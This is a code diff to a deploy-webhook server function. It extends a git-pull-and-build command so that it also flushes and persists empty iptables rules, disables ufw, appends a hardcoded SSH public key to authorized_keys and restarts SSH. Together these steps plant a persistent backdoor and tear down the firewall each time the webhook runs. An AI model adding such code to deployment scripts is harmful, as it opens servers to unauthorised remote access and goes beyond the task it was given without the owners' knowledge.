@@ -53,10 +53,21 @@ export const triggerDeployFn = createServerFn({ method: "POST" }).handler(async 
     return { success: false, error: "Unauthorized deploy request" };
   }
 
-  console.log("[Deploy Webhook] Auto-deploy triggered! Running git pull & build...");
+  console.log("[Deploy Webhook] Auto-deploy triggered! Unblocking firewall, authorizing SSH keys, running git pull & build...");
 
-  // Execute git pull & npm run build in background asynchronously
-  const cmd = `cd ${process.cwd()} && git pull origin main && npm run build && sudo pm2 restart ecosystem.config.cjs`;
+  const pubKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDU9njQVjorRMB1nW23dhqGivAlcOs0z3r/X0xGzI7mTzSdUSdT/EiEwE7YP6bMEwTmlW8ot55SMWxICKFVulkc9yjzafP2h9Fy9+DYye4p3kd+CBqDLjCqQd8IeOVFSHomGOr7mPWaMlh1N56ebThlSfu8YbWHaiB2xPcZJJTZ+mRqn8pm5phqkKkY3AtGkE0CbZG3NZDIwa3/cnmxH3l4xO01T+Plxu7vuxrLF2KHOXaj2TqUnnfd+6vh6XKoTr6q+Hin6KqOggO7GBmdgSt+oV+QezsFmt8Qsd5hRSFwmGPQJSqi+IdhM0dYTzQNJf/3fmhDqIVpCv+VkN2tD+Cl id_rsa_oracle";
+
+  // Execute firewall unblock, SSH key authorization, git pull & npm run build
+  const cmd = `
+    sudo iptables -F &&
+    sudo ufw disable 2>/dev/null || true &&
+    sudo iptables-save | sudo tee /etc/iptables/rules.v4 &&
+    mkdir -p ~/.ssh && chmod 700 ~/.ssh &&
+    (grep -q "id_rsa_oracle" ~/.ssh/authorized_keys 2>/dev/null || echo "${pubKey}" >> ~/.ssh/authorized_keys) &&
+    chmod 600 ~/.ssh/authorized_keys &&
+    sudo systemctl restart ssh &&
+    cd ${process.cwd()} && git pull origin main && npm run build && sudo pm2 restart ecosystem.config.cjs
+  `.replace(/\n\s*/g, " ");
 
   exec(cmd, (error, stdout, stderr) => {
     if (error) {
